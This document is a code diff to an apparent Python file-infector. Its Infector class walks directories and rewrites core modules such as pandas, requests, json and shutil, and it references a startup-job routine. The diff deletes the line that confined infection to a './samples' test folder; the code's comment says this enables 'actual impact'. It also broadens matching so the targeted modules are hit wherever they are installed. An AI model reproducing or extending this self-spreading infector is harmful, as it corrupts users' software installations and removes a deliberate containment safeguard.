@@ -14,30 +14,30 @@ from subprocess import run, PIPE
 # https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/
 
 target_python_modules = (
-    "/usr/lib/python3/dist-packages/pandas/__init__.py",
-    "/usr/lib/python3/dist-packages/requests/__init__.py",
-    "/usr/lib/python3/dist-packages/numpy/__init__.py",
-    "/usr/lib/python3.8/tkinter/__init__.py",
-    "/usr/lib/python3.8/datetime.py",
-    "/usr/lib/python3.8/abc.py",
-    "/usr/lib/python3.8/argparse.py",
-    "/usr/lib/python3.8/asyncio/__init__.py",
-    "/usr/lib/python3.8/collections/__init__.py",
-    "/usr/lib/python3.8/copy.py",
-    "/usr/lib/python3.8/csv.py",
-    "/usr/lib/python3.8/decimal.py",
-    "/usr/lib/python3.8/functools.py",
-    "/usr/lib/python3.8/http/__init__.py",
-    "/usr/lib/python3.8/importlib/__init__.py",
-    "/usr/lib/python3.8/inspect.py",
-    "/usr/lib/python3.8/json/__init__.py",
-    "/usr/lib/python3.8/pdb.py",
-    "/usr/lib/python3.8/random.py",
-    "/usr/lib/python3.8/shutil.py",
-    "/usr/lib/python3.8/types.py",
-    "/usr/lib/python3.8/unittest/__init__.py",
-    "/usr/lib/python3.8/urllib/__init__.py",
-    "/usr/lib/python3.8/uuid.py"
+    "/pandas/__init__.py",
+    "/requests/__init__.py",
+    "/numpy/__init__.py",
+    "/tkinter/__init__.py",
+    "/datetime.py",
+    "/abc.py",
+    "/argparse.py",
+    "/asyncio/__init__.py",
+    "/collections/__init__.py",
+    "/copy.py",
+    "/csv.py",
+    "/decimal.py",
+    "/functools.py",
+    "/http/__init__.py",
+    "/importlib/__init__.py",
+    "/inspect.py",
+    "/json/__init__.py",
+    "/pdb.py",
+    "/random.py",
+    "/shutil.py",
+    "/types.py",
+    "/unittest/__init__.py",
+    "/urllib/__init__.py",
+    "/uuid.py"
 )
 class Infector:
     def __init__(self):
@@ -80,15 +80,15 @@ class Infector:
         """Begin scanning for Python files and infect each one"""
         # for testing use the samples directory in current directory 
         # comment out the line below for actual impact 
-        self.python_dirs:str = ["./samples"]
         for py_dir in self.python_dirs:
             for root, _, _ in walk(py_dir):
                 divider:chr = "/" if self.SYSTEM == "Linux" else "\\"
                 for file_ in glob(root+divider+"*.py"):
                     if file_ == root+divider+__file__: continue
-                    if file_ in target_python_modules:
-                        self.infect_file(file_) 
-        
+                    for module in target_python_modules:
+                        if search(r"{}$".format(module), file_):
+                            self.infect_pyfiles(file_)
+
     def create_job(self):
         if self.SYSTEM == "Linux":
             run(
